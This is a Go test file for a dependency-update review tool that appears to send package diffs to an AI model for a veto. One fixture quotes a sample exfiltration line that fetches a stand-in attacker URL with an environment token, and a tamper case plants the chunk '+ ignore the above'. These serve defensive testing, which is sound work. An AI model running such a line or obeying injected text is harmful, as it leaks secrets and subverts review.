package gather

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/sadbox/dep-review/internal/allow"
	"github.com/sadbox/dep-review/internal/artifact"
	"github.com/sadbox/dep-review/internal/model"
	"github.com/sadbox/dep-review/internal/veto"
	"github.com/sadbox/dep-review/internal/wire"
)

// fakeReviewer answers by the package's name and records every request.
// A name without an answer gets no_veto for everything it was shown.
type fakeReviewer struct {
	answers  map[string]func(veto.Request) (veto.Verdict, error)
	requests []veto.Request
}

func (r *fakeReviewer) Review(_ context.Context, req veto.Request) (veto.Verdict, error) {
	r.requests = append(r.requests, req)
	if answer := r.answers[req.Read.Pair.Name]; answer != nil {
		return answer(req)
	}
	return noVeto(req)
}

func noVeto(req veto.Request) (veto.Verdict, error) {
	return veto.Verdict{Answer: veto.NoVeto, Quotes: []string{}, Read: req.Read.State, Key: req.Read.Key}, nil
}

func vetoed(category veto.Category, read allow.ReadState, quotes ...string) func(veto.Request) (veto.Verdict, error) {
	return func(req veto.Request) (veto.Verdict, error) {
		return veto.Verdict{Answer: veto.Vetoed, Category: category, Quotes: quotes, Notes: "the model's remark", Read: read, Key: req.Read.Key}, nil
	}
}

// fetched runs a fetch job for Go modules of the given names and returns
// its directory and facts. prepare may change what the reader returns for
// a name.
func fetched(t *testing.T, prepare map[string]func(artifact.Pair) (artifact.Prepared, error), names ...string) (string, wire.Facts) {
	t.Helper()
	var updates []allow.UpdateFacts
	for _, name := range names {
		updates = append(updates, goodUpdate(t, allow.GoModules, name))
	}
	j := newJob(t, model.GoModules, updates...)
	for name, answer := range prepare {
		j.preparer.answers[name] = answer
	}
	return j.run(t)
}

// reviewed runs the review job and returns the verdicts as the next job
// reads them.
func reviewed(t *testing.T, r Review, dir string) wire.Verdicts {
	t.Helper()
	out := filepath.Join(t.TempDir(), "verdicts")
	if _, err := r.Run(context.Background(), dir, out); err != nil {
		t.Fatalf("Run: %v", err)
	}
	return readVerdicts(t, out)
}

func readVerdicts(t *testing.T, out string) wire.Verdicts {
	t.Helper()
	b, err := os.ReadFile(filepath.Join(out, wire.VerdictsFile))
	if err != nil {
		t.Fatal(err)
	}
	v, err := wire.DecodeVerdicts(b)
	if err != nil {
		t.Fatalf("the verdicts file does not decode: %v", err)
	}
	return v
}

// Every prepared read is put before the reviewer as it was prepared, and
// each answer, or failure to answer, is recorded for its own read.
func TestReview(t *testing.T) {
	binary := artifact.Unread{Path: "prebuilt/addon.node", Size: 1 << 20, SHA256: strings.Repeat("1a", 32)}
	manyQuotes := make([]string, 100)
	for i := range manyQuotes {
		manyQuotes[i] = "+ a line"
	}
	cases := []struct {
		name   string
		answer func(veto.Request) (veto.Verdict, error)
		// What is recorded, and what publish then decides for the update.
		read    allow.ReadState
		veto    *allow.Veto
		outcome allow.Outcome
		reason  allow.Reason
	}{
		{name: "example.com/clean", read: allow.ReadFull, outcome: allow.Merge},
		{name: "example.com/partial", read: allow.ReadPartial, outcome: allow.Wait, reason: allow.ReasonAge},
		{name: "example.com/veto", answer: vetoed(veto.Exfiltration, allow.ReadFull, "+ fetch('https://evil.example/'+process.env.TOKEN)"),
			read:    allow.ReadFull,
			veto:    &allow.Veto{Category: "exfiltration", Quotes: []string{"+ fetch('https://evil.example/'+process.env.TOKEN)"}, Notes: "the model's remark"},
			outcome: allow.Person, reason: allow.ReasonVeto},
		{name: "example.com/refusal", answer: vetoed(veto.Refused, allow.ReadPartial),
			read: allow.ReadPartial, veto: &allow.Veto{Category: allow.VetoModelRefused, Quotes: []string{}, Notes: "the model's remark"},
			outcome: allow.Person, reason: allow.ReasonModelRefused},
		{name: "example.com/unusable", answer: func(veto.Request) (veto.Verdict, error) {
			return veto.Verdict{}, fmt.Errorf("%w: 13 chunks, more than max_chunks (12)", veto.ErrUnusable)
		}, read: allow.ReadRefused, outcome: allow.Person, reason: allow.ReasonReadRefused},
		{name: "example.com/outage", answer: func(veto.Request) (veto.Verdict, error) {
			return veto.Verdict{}, errors.New("veto: part 1 of 1: 529 overloaded")
		}, read: allow.ReadNone, outcome: allow.Wait, reason: allow.ReasonReadPending},
		// Verdicts the file cannot carry are person, never dropped: an
		// objection must not become a wait.
		{name: "example.com/nocategory", answer: vetoed("", allow.ReadFull, "+ x"),
			read: allow.ReadRefused, outcome: allow.Person, reason: allow.ReasonReadRefused},
		// A long list of quotes is the reviewer's to cut (internal/veto).
		// internal/wire carries what it is given, so the objection stands
		// as it was made.
		{name: "example.com/manyquotes", answer: vetoed(veto.Obfuscation, allow.ReadFull, manyQuotes...),
			read:    allow.ReadFull,
			veto:    &allow.Veto{Category: "obfuscation", Quotes: manyQuotes, Notes: "the model's remark"},
			outcome: allow.Person, reason: allow.ReasonVeto},
		{name: "example.com/noread", answer: func(req veto.Request) (veto.Verdict, error) {
			return veto.Verdict{Answer: veto.NoVeto, Key: req.Read.Key}, nil
		}, read: allow.ReadRefused, outcome: allow.Person, reason: allow.ReasonReadRefused},
		// An answer that is neither of the two is not a no_veto.
		{name: "example.com/oddanswer", answer: func(req veto.Request) (veto.Verdict, error) {
			return veto.Verdict{Answer: "approve", Read: allow.ReadFull, Key: req.Read.Key}, nil
		}, read: allow.ReadRefused, outcome: allow.Person, reason: allow.ReasonReadRefused},
		{name: "example.com/last", read: allow.ReadFull, outcome: allow.Merge},
	}

	var names []string
	reviewer := &fakeReviewer{answers: map[string]func(veto.Request) (veto.Verdict, error){}}
	for _, tc := range cases {
		names = append(names, tc.name)
		if tc.answer != nil {
			reviewer.answers[tc.name] = tc.answer
		}
	}
	sent := map[string]artifact.Prepared{}
	prepare := map[string]func(artifact.Pair) (artifact.Prepared, error){
		"example.com/clean": func(p artifact.Pair) (artifact.Prepared, error) {
			out := preparedRead(p, "== file: a.go (changed)\n+one\n", "== file: b.go (added)\n+two \x00 not text to anyone here\n")
			sent[p.Name] = out
			return out, nil
		},
		"example.com/partial": func(p artifact.Pair) (artifact.Prepared, error) {
			out := preparedRead(p, "+x\n")
			out.State, out.Unread = allow.ReadPartial, []artifact.Unread{binary}
			sent[p.Name] = out
			return out, nil
		},
	}
	dir, f := fetched(t, prepare, names...)
	got := reviewed(t, Review{Reviewer: reviewer, Fingerprint: finger, Logf: t.Logf}, dir)

	if len(reviewer.requests) != len(cases) || len(got.Verdicts) != len(cases) {
		t.Fatalf("%d requests and %d verdicts for %d reads", len(reviewer.requests), len(got.Verdicts), len(cases))
	}
	d := allow.Decide(wire.Join(f, got, finger), defaults(t).Policy(), now)
	for i, tc := range cases {
		v := got.Verdicts[i]
		if v.Key != f.Facts.Updates[i].Prepared.Key || v.Fingerprint != finger {
			t.Errorf("%s: verdict for key %s under %s", tc.name, v.Key, v.Fingerprint)
		}
		if v.Read != tc.read || !reflect.DeepEqual(v.Veto, tc.veto) {
			t.Errorf("%s: recorded %s %+v, want %s %+v", tc.name, v.Read, v.Veto, tc.read, tc.veto)
		}
		if ud := d.PerUpdate[i]; ud.Outcome != tc.outcome || (tc.reason != "" && !reflect.DeepEqual(ud.Reasons, []allow.Reason{tc.reason})) {
			t.Errorf("%s: decided %s %v, want %s %q", tc.name, ud.Outcome, ud.Reasons, tc.outcome, tc.reason)
		}
	}

	// What the reviewer was given is the read as it was prepared: the
	// chunks byte for byte and in order, the unread list, the state and
	// the key, and the update's name and versions.
	for i, name := range []string{"example.com/clean", "example.com/partial"} {
		want, req := sent[name], reviewer.requests[i].Read
		if !reflect.DeepEqual(req.Chunks, want.Chunks) || !reflect.DeepEqual(req.Unread, want.Unread) || req.State != want.State || req.Key != want.Key {
			t.Errorf("%s: the reviewer was given %+v, want %+v", name, req, want)
		}
		if want := (artifact.Pair{Ecosystem: allow.GoModules, Name: name, From: "1.2.3", To: "1.3.0"}); !reflect.DeepEqual(req.Pair, want) {
			t.Errorf("%s: pair %+v, want %+v", name, req.Pair, want)
		}
	}
}

// noRequests is a transport for a reviewer that must not ask anything.
type noRequests struct{ t *testing.T }

func (n noRequests) RoundTrip(req *http.Request) (*http.Response, error) {
	n.t.Errorf("the reviewer made a request: %s %s", req.Method, req.URL)
	return nil, errors.New("no request was expected")
}

// Two artifacts that hold the same files are a whole read that nobody
// reads. That is the usual update of a module such as
// google.golang.org/genproto/googleapis/rpc, whose pseudo-version follows
// its repository's head while the module itself seldom changes (spec
// section 11, amendment 40). The facts file says so in the read's status,
// the review job is not started for it and writes no verdict that a
// model did not give, and the update merges like any other (amendment
// 53).
func TestReviewNothingChanged(t *testing.T) {
	u := goodUpdate(t, allow.GoModules, "google.golang.org/genproto/googleapis/rpc")
	u.From, u.To = "v0.0.0-20260917231906-eeb232e0883d", "v0.0.0-20261118221215-c8830f628b3f"
	if !u.Listed.Holds() {
		t.Fatal("the module is not on the built-in list; the test proves nothing")
	}
	j := newJob(t, model.GoModules, u)
	j.preparer.answers[u.Name] = func(p artifact.Pair) (artifact.Prepared, error) { return preparedRead(p), nil }
	dir, f := j.run(t)
	read := f.Facts.Updates[0].Prepared
	if read.Status != wire.Identical || !strings.Contains(read.Detail, "no model is asked") || read.Key != "" || len(read.Chunks) != 0 || len(chunkFiles(t, dir)) != 0 {
		t.Fatalf("the read fetch recorded: %+v", read)
	}

	// The review job, were it started all the same, asks nobody and
	// records nothing for the read.
	settings := veto.FromConfig(defaults(t))
	client, err := veto.New(settings, veto.APIKey("test-key"), &http.Client{Transport: noRequests{t}})
	if err != nil {
		t.Fatal(err)
	}
	got := reviewed(t, Review{Reviewer: client, Fingerprint: settings.Fingerprint(), Logf: t.Logf}, dir)
	if len(got.Verdicts) != 0 {
		t.Fatalf("verdicts %+v, want none: no model was asked", got.Verdicts)
	}
	wantOutcome(t, allow.Decide(wire.Join(f, got, settings.Fingerprint()), defaults(t).Policy(), now), allow.Merge, "")
	// Nor does it wait for a review job: with no verdicts file at all the
	// answer is the same.
	wantOutcome(t, decide(t, f, nil), allow.Merge, "")
}

// Something changed and none of it is text: a prebuilt object, an image,
// a file past the budget. No model can be asked about it, so it is not a
// read in part that merges once it is old enough: the gate refuses the
// read and a person looks (spec section 11, amendment 53).
func TestFetchNothingReadable(t *testing.T) {
	j := newJob(t, model.GoModules, goodUpdate(t, allow.GoModules, "example.com/m"))
	j.preparer.answers["example.com/m"] = func(p artifact.Pair) (artifact.Prepared, error) {
		out := preparedRead(p)
		out.State = allow.ReadPartial
		out.Unread = []artifact.Unread{{Path: "pkg/rsrc.syso", Size: 20, SHA256: strings.Repeat("1a", 32)}}
		return out, nil
	}
	dir, f := j.run(t)
	read := f.Facts.Updates[0].Prepared
	if read.Status != wire.Refused || !strings.Contains(read.Detail, "no model was asked") || len(chunkFiles(t, dir)) != 0 {
		t.Fatalf("the read fetch recorded: %+v", read)
	}
	// Whatever a verdicts file says for it, and however old the version.
	for _, verdicts := range [][]wire.Verdict{nil, {{Key: strings.Repeat("7", 64), Fingerprint: finger, Read: allow.ReadPartial}}} {
		d := allow.Decide(wire.Join(f, wire.Verdicts{Version: wire.Version, Verdicts: verdicts}, finger), defaults(t).Policy(), now.Add(365*24*time.Hour))
		wantOutcome(t, d, allow.Person, allow.ReasonReadRefused)
	}
}

// Two updates with the same read have one verdict, asked for once.
func TestReviewOncePerKey(t *testing.T) {
	same := func(p artifact.Pair) (artifact.Prepared, error) {
		out := preparedRead(p, "+x\n")
		out.Key = strings.Repeat("7", 64)
		return out, nil
	}
	dir, f := fetched(t, map[string]func(artifact.Pair) (artifact.Prepared, error){"example.com/a": same, "example.com/b": same},
		"example.com/a", "example.com/b")
	reviewer := &fakeReviewer{}
	got := reviewed(t, Review{Reviewer: reviewer, Fingerprint: finger}, dir)
	if len(reviewer.requests) != 1 || len(got.Verdicts) != 1 {
		t.Fatalf("%d requests, %d verdicts", len(reviewer.requests), len(got.Verdicts))
	}
	wantOutcome(t, allow.Decide(wire.Join(f, got, finger), defaults(t).Policy(), now), allow.Merge, "")
}

// The scheduled run's review has a skip list: a read on it is not put
// before the reviewer and gets no entry, and a run that asked about
// nothing writes no file, so that a file means the model was asked (spec
// section 11, amendment 64). A skipped read is not thereby read: what
// publish makes of it is what the gate's own comment remembers.
func TestReviewSkipsWhatWasAnswered(t *testing.T) {
	dir, f := fetched(t, nil, "example.com/a", "example.com/b", "example.com/c")
	keyOf := func(i int) string { return f.Facts.Updates[i].Prepared.Key }

	reviewer := &fakeReviewer{}
	got := reviewed(t, Review{Reviewer: reviewer, Fingerprint: finger, Answered: map[string]bool{keyOf(0): true, keyOf(2): true}}, dir)
	if len(reviewer.requests) != 1 || reviewer.requests[0].Read.Pair.Name != "example.com/b" {
		t.Fatalf("requests %+v, want one, for the read that is not on the list", reviewer.requests)
	}
	if len(got.Verdicts) != 1 || got.Verdicts[0].Key != keyOf(1) {
		t.Fatalf("verdicts %+v, want one, for the read that was asked about", got.Verdicts)
	}
	// The two skipped reads have no verdict here: on these verdicts alone
	// the pull request waits for them.
	d := allow.Decide(wire.Join(f, got, finger), defaults(t).Policy(), now)
	wantOutcome(t, d, allow.Wait, allow.ReasonReadPending)

	// Everything on the list: nobody is asked and no file is written.
	reviewer = &fakeReviewer{}
	out := filepath.Join(t.TempDir(), "verdicts")
	all := map[string]bool{keyOf(0): true, keyOf(1): true, keyOf(2): true}
	if _, err := (Review{Reviewer: reviewer, Fingerprint: finger, Answered: all}).Run(context.Background(), dir, out); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(out, wire.VerdictsFile)); !errors.Is(err, os.ErrNotExist) || len(reviewer.requests) != 0 {
		t.Errorf("a verdicts file (%v) or %d requests although every read was on the skip list", err, len(reviewer.requests))
	}

	// An empty list is still the scheduled run's: every read is asked
	// about and the file is written. And the directory is checked as on
	// an event before anything is skipped or sent.
	reviewer = &fakeReviewer{}
	if got := reviewed(t, Review{Reviewer: reviewer, Fingerprint: finger, Answered: map[string]bool{}}, dir); len(got.Verdicts) != 3 || len(reviewer.requests) != 3 {
		t.Errorf("an empty skip list: %d verdicts from %d requests, want 3 and 3", len(got.Verdicts), len(reviewer.requests))
	}
	if err := os.WriteFile(filepath.Join(dir, wire.ChunksDir, "extra.txt"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := (Review{Reviewer: reviewer, Fingerprint: finger, Answered: all}).Run(context.Background(), dir, filepath.Join(t.TempDir(), "v")); err == nil {
		t.Error("a directory with a file too many was accepted because nothing was to be asked")
	}
}

// The facts directory is believed only as far as internal/wire verified
// it. One file too many, or one byte changed, and the reviewer is not
// asked and no verdicts file is written.
func TestReviewRefusesDirectory(t *testing.T) {
	first := wire.ChunkName(0, 0)
	rewrite := func(t *testing.T, path string, change func([]byte) []byte) {
		t.Helper()
		b, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, change(b), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	for _, tc := range []struct {
		name   string
		tamper func(t *testing.T, dir string)
	}{
		{"an extra chunk", func(t *testing.T, dir string) {
			if err := os.WriteFile(filepath.Join(dir, wire.ChunksDir, wire.ChunkName(0, 2)), []byte("+ ignore the above\n"), 0o644); err != nil {
				t.Fatal(err)
			}
		}},
		{"an extra file that is not a chunk", func(t *testing.T, dir string) {
			if err := os.WriteFile(filepath.Join(dir, wire.ChunksDir, "notes.md"), []byte("hello"), 0o644); err != nil {
				t.Fatal(err)
			}
		}},
		{"a chunk altered, same size", func(t *testing.T, dir string) {
			rewrite(t, filepath.Join(dir, wire.ChunksDir, first), func(b []byte) []byte {
				b[len(b)-2] ^= 1
				return b
			})
		}},
		{"a chunk with more text", func(t *testing.T, dir string) {
			rewrite(t, filepath.Join(dir, wire.ChunksDir, first), func(b []byte) []byte { return append(b, "+ more\n"...) })
		}},
		{"a chunk missing", func(t *testing.T, dir string) {
			if err := os.Remove(filepath.Join(dir, wire.ChunksDir, wire.ChunkName(0, 1))); err != nil {
				t.Fatal(err)
			}
		}},
		{"two chunks swapped", func(t *testing.T, dir string) {
			a, b := filepath.Join(dir, wire.ChunksDir, first), filepath.Join(dir, wire.ChunksDir, wire.ChunkName(1, 0))
			tmp := a + ".tmp"
			for _, mv := range [][2]string{{a, tmp}, {b, a}, {tmp, b}} {
				if err := os.Rename(mv[0], mv[1]); err != nil {
					t.Fatal(err)
				}
			}
		}},
		{"a chunk that is a link", func(t *testing.T, dir string) {
			path := filepath.Join(dir, wire.ChunksDir, first)
			target := filepath.Join(dir, "elsewhere.txt")
			if err := os.Rename(path, target); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(target, path); err != nil {
				t.Skipf("no symbolic links here: %v", err)
			}
		}},
		{"no chunk directory", func(t *testing.T, dir string) {
			if err := os.RemoveAll(filepath.Join(dir, wire.ChunksDir)); err != nil {
				t.Fatal(err)
			}
		}},
		{"a facts file that says it was read", func(t *testing.T, dir string) {
			rewrite(t, filepath.Join(dir, wire.FactsFile), func(b []byte) []byte {
				return []byte(strings.Replace(string(b), `"prepared":`, `"read": "full", "prepared":`, 1))
			})
		}},
		{"a facts file of another version", func(t *testing.T, dir string) {
			rewrite(t, filepath.Join(dir, wire.FactsFile), func(b []byte) []byte {
				return []byte(strings.Replace(string(b), `"version": 1`, `"version": 2`, 1))
			})
		}},
		{"a facts file cut short", func(t *testing.T, dir string) {
			rewrite(t, filepath.Join(dir, wire.FactsFile), func(b []byte) []byte { return b[:len(b)/2] })
		}},
		{"no facts file", func(t *testing.T, dir string) {
			if err := os.Remove(filepath.Join(dir, wire.FactsFile)); err != nil {
				t.Fatal(err)
			}
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			two := func(p artifact.Pair) (artifact.Prepared, error) { return preparedRead(p, "+one\n", "+two\n"), nil }
			dir, _ := fetched(t, map[string]func(artifact.Pair) (artifact.Prepared, error){"example.com/a": two}, "example.com/a", "example.com/b")
			// Untouched, the directory is one the review job takes.
			if got := reviewed(t, Review{Reviewer: &fakeReviewer{}, Fingerprint: finger}, dir); len(got.Verdicts) != 2 {
				t.Fatalf("%d verdicts before tampering", len(got.Verdicts))
			}

			tc.tamper(t, dir)
			reviewer := &fakeReviewer{}
			out := filepath.Join(t.TempDir(), "verdicts")
			if _, err := (Review{Reviewer: reviewer, Fingerprint: finger}).Run(context.Background(), dir, out); err == nil {
				t.Error("the directory was accepted")
			}
			if len(reviewer.requests) != 0 {
				t.Errorf("the reviewer was asked %d times", len(reviewer.requests))
			}
			if _, err := os.Stat(filepath.Join(out, wire.VerdictsFile)); !os.IsNotExist(err) {
				t.Errorf("a verdicts file was written: %v", err)
			}
		})
	}
}

// When the context ends, what was answered is written, the rest has no
// entry, and the caller is told.
func TestReviewContextEnds(t *testing.T) {
	dir, f := fetched(t, nil, "example.com/a", "example.com/b", "example.com/c")
	ctx, cancel := context.WithCancel(context.Background())
	reviewer := &fakeReviewer{answers: map[string]func(veto.Request) (veto.Verdict, error){
		"example.com/b": func(veto.Request) (veto.Verdict, error) {
			cancel()
			return veto.Verdict{}, fmt.Errorf("veto: %w", context.Canceled)
		},
	}}
	out := filepath.Join(t.TempDir(), "verdicts")
	_, err := Review{Reviewer: reviewer, Fingerprint: finger}.Run(ctx, dir, out)
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("Run: %v, want the context's error", err)
	}
	got := readVerdicts(t, out)
	if len(reviewer.requests) != 2 || len(got.Verdicts) != 2 || got.Verdicts[0].Read != allow.ReadFull || got.Verdicts[1].Read != allow.ReadNone {
		t.Fatalf("%d requests, verdicts %+v", len(reviewer.requests), got.Verdicts)
	}
	// The first update was read. The pull request waits for the others.
	d := allow.Decide(wire.Join(f, got, finger), defaults(t).Policy(), now)
	wantOutcome(t, d, allow.Wait, allow.ReasonReadPending)
	if d.PerUpdate[0].Outcome != allow.Merge {
		t.Errorf("the answered update: %s %v", d.PerUpdate[0].Outcome, d.PerUpdate[0].Reasons)
	}
}

// A pull request with nothing to read still gets a verdicts file, and a
// fingerprint that is not one is refused before anything is asked.
func TestReviewEdges(t *testing.T) {
	t.Run("nothing prepared", func(t *testing.T) {
		j := newJob(t, model.Docker, goodUpdate(t, allow.Docker, listedName[allow.Docker]))
		dir, f := j.run(t)
		// An upload drops an empty directory.
		if err := os.Remove(filepath.Join(dir, wire.ChunksDir)); err != nil {
			t.Fatal(err)
		}
		reviewer := &fakeReviewer{}
		got := reviewed(t, Review{Reviewer: reviewer, Fingerprint: finger}, dir)
		if len(got.Verdicts) != 0 || len(reviewer.requests) != 0 {
			t.Errorf("verdicts %+v after %d requests", got.Verdicts, len(reviewer.requests))
		}
		wantOutcome(t, allow.Decide(wire.Join(f, got, finger), defaults(t).Policy(), now), allow.Merge, "")
	})
	t.Run("a fingerprint that is not one", func(t *testing.T) {
		dir, _ := fetched(t, nil, "example.com/m")
		reviewer := &fakeReviewer{}
		out := filepath.Join(t.TempDir(), "verdicts")
		if _, err := (Review{Reviewer: reviewer, Fingerprint: "claude-opus-5-5/high"}).Run(context.Background(), dir, out); err == nil {
			t.Error("Run succeeded")
		}
		if len(reviewer.requests) != 0 {
			t.Error("the reviewer was asked")
		}
	})
	// There is no review without a model: a job that has none writes no
	// verdicts file of its own making.
	t.Run("no reviewer", func(t *testing.T) {
		dir, _ := fetched(t, nil, "example.com/m")
		out := filepath.Join(t.TempDir(), "verdicts")
		if _, err := (Review{Fingerprint: finger}).Run(context.Background(), dir, out); err == nil {
			t.Error("Run succeeded")
		}
		if _, err := os.Stat(filepath.Join(out, wire.VerdictsFile)); !os.IsNotExist(err) {
			t.Errorf("a verdicts file was written: %v", err)
		}
	})
}

// A chunk's bytes are checked again as they are read for the request:
// what is sent is what the facts file lists, not what was in the
// directory when it was verified.
func TestReadChunk(t *testing.T) {
	dir := t.TempDir()
	const text = "== file: a.go (changed)\n+new\n"
	good := wire.NewChunkFile(0, 0, text)
	if err := os.WriteFile(filepath.Join(dir, good.Name), []byte(text), 0o644); err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(t.TempDir(), "outside.txt")
	if err := os.WriteFile(outside, []byte(text), 0o644); err != nil {
		t.Fatal(err)
	}
	rel, err := filepath.Rel(dir, outside)
	if err != nil {
		t.Fatal(err)
	}

	if got, err := wire.ReadChunk(dir, good); err != nil || string(got) != text {
		t.Fatalf("ReadChunk: %q, %v", got, err)
	}
	for _, tc := range []struct {
		name   string
		change func(*wire.ChunkFile)
	}{
		{"another hash", func(c *wire.ChunkFile) { c.SHA256 = strings.Repeat("0", 64) }},
		{"a larger size", func(c *wire.ChunkFile) { c.Size++ }},
		{"a smaller size", func(c *wire.ChunkFile) { c.Size-- }},
		{"a file that is not there", func(c *wire.ChunkFile) { c.Name = wire.ChunkName(0, 1) }},
		// The same bytes, outside the directory.
		{"a path out of the directory", func(c *wire.ChunkFile) { c.Name = rel }},
		{"an absolute path", func(c *wire.ChunkFile) { c.Name = outside }},
	} {
		c := good
		tc.change(&c)
		if got, err := wire.ReadChunk(dir, c); err == nil {
			t.Errorf("%s: read %q", tc.name, got)
		}
	}
}
